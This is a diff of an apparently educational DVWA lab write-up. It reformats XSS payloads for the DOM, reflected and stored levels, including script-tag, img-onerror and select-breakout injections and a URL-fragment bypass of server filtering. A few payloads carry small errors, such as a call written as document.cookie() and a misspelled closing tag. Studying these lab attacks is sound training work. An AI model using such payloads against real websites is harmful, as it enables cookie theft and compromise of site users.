@@ -135,7 +135,10 @@ The above website is a phishing website created by the attacker, it sends a requ
 ---
 # XSS DOM
 ## Low 
-**Attack :**  `<script>alert("hacked")</script>`
+**Attack :**  
+```html 
+<script>alert("hacked")</script>
+```
 ## Medium
 ```html
 <select name="default">
@@ -155,7 +158,10 @@ The above website is a phishing website created by the attacker, it sends a requ
 ```
 We have to break out of the `<select>` tag, and for that we have to, use the following command.
 Our input is `lang`	, from there,
-**Attack :**`></option></script></select><img src=x onerror=alert("hacked")>`
+**Attack :**
+```html
+></option></script></select><img src=x onerror=alert("hacked")>
+```
 ## High
 The programmer has set it in such a way that, any other input we give other than the four languages will be defaulted to English.
 
@@ -179,7 +185,10 @@ if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {
 ?>	
 ```
 We should avoid sending the payload to the server, for blacklisting, so, we use the `#`
-**Attack :** English#<script>alert("hacked")</script>
+**Attack :** 
+```html
+English#<script>alert("hacked")</script>
+```
 
 # XSS REFLECTED
 ## Low 
@@ -197,7 +206,11 @@ Only script tags are being targetted by this programmer, use an img tag instead.
 
 # XSS STORAGE
 ## Low 
-**Attack :**  `<script>alert("hacked")</sript>` (in Message)
+**Attack :**  
+```html 
+    <script>alert("hacked")</sript>
+``` 
+(in Message)
 ## Medium
 Some level of filtering has been done in both input blocks, but the name tag has a weaker level of filtering.
 
@@ -216,7 +229,10 @@ The strip_tags function is strong and removes all html, php tags. We can target 
 * Note, that it has a maxlength value set to 10, increase it to 50.
 * Attack the `name` field.
 
-**Attack :** `<SCRIPT>alert("hacked")</SCRIPT>`
+**Attack :** 
+```html
+    \<SCRIPT>alert(document.cookie())\</SCRIPT>
+```
 ## High
 It is the same case as medium, but this time, there is too much focus on the script tag, so try img tags.
 **Attack :** `<img src=x onerror=alert("hacked")>` in Name
